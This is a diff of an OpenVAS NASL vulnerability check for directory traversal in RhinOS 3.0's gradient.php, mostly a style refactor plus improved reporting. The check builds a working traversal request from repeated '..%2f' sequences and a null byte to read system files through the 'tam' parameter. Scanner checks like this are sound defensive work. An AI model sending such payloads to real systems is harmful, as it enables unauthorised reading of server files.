@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_RhinOS_46731.nasl 5642 2017-03-21 08:49:30Z cfi $
+# $Id: gb_RhinOS_46731.nasl 5717 2017-03-24 13:02:24Z cfi $
 #
 # RhinOS 'gradient.php' Multiple Directory Traversal Vulnerabilities
 #
@@ -32,24 +32,20 @@ information that could aid in further attacks.
 
 RhinOS 3.0 r1113 is vulnerable; other versions may also be affected.";
 
-
 if (description)
 {
  script_id(103108);
- script_version("$Revision: 5642 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-21 09:49:30 +0100 (Tue, 21 Mar 2017) $");
+ script_version("$Revision: 5717 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-24 14:02:24 +0100 (Fri, 24 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-03-04 13:25:07 +0100 (Fri, 04 Mar 2011)");
  script_bugtraq_id(46731);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("RhinOS 'gradient.php' Multiple Directory Traversal Vulnerabilities");
-
  script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46731");
  script_xref(name : "URL" , value : "http://www.autosectools.com/Advisories/RhinOS.3.0.r1113_Local.File.Inclusion_133.html");
  script_xref(name : "URL" , value : "http://www.saltos.net/portal/en/rhinos.htm");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_summary("Determine if RhinOS is prone to multiple directory-traversal vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
@@ -61,31 +57,28 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
-   
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+include("host_details.inc");
 
-if(!can_host_php(port:port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
 files = traversal_files();
 
-dirs = make_list("/rhinos","/rhinos-es-3.0",cgi_dirs());
+foreach dir( make_list_unique( "/rhinos", "/rhinos-es-3.0", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-  foreach file (keys(files)) {
-   
-    url = string(dir,"/admin/lib/gradient/gradient.php?tam=",crap(data:"..%2f",length:10*9),files[file],"%00"); 
+  if( dir == "/" ) dir = "";
 
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
+  foreach file( keys( files ) ) {
 
+    url = dir + "/admin/lib/gradient/gradient.php?tam=" + crap( data:"..%2f", length:10 * 9 ) + files[file] + "%00";
+
+    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
-  } 
+  }
 }
 
-exit(0);
+exit( 99 );
